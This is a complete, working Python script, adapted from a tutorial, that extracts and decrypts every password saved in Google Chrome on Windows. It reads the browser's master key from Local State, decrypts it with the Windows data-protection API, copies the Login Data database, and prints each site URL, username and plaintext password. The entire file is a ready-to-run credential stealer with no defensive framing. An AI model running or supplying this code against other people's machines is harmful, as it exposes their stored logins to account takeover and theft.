# https://www.thepythoncode.com/article/extract-chrome-passwords-python
# or https://github.com/hassaanaliw/chromepass

import os
import json
import base64
import win32crypt
import sqlite3
import shutil
from Crypto.Cipher import AES

#print(os.environ['USERPROFILE'])

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                    "Google", "Chrome",
                                    "User Data", "Local State")

    #print(local_state_path)

    with open(local_state_path, 'r', encoding = 'utf-8') as f:
        local_state = f.read()
        #print(type(local_state))
        local_state = json.loads(local_state)

    enctypted_key = local_state["os_crypt"]["encrypted_key"]
    #print(enctypted_key)

    key = base64.b64decode(enctypted_key)
    #print(key)

    key = key[5:]
    #print(key)

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            #print(f'NOT SUPPORTED')
            #return 'SHIT'
            return ''

def main():
    key = get_encryption_key()
    print(key)
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome",
                            "User Data", "default", "Login Data")

    filename = 'ChromeData.db'
    shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    
    sql_query = 'select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created'
    cursor.execute(sql_query)

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        #date_created = row[4]
        #date_last_used = row[5]

        if username or password:
            print(f'Origin URL: {origin_url}')
            print(f'Action URL: {action_url}')
            print(f'Username: {username}')
            print(f'Password: {password}')
        else:
            continue

        print('='*50)
        
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        print('except remove the copied db file')
        pass
main()

























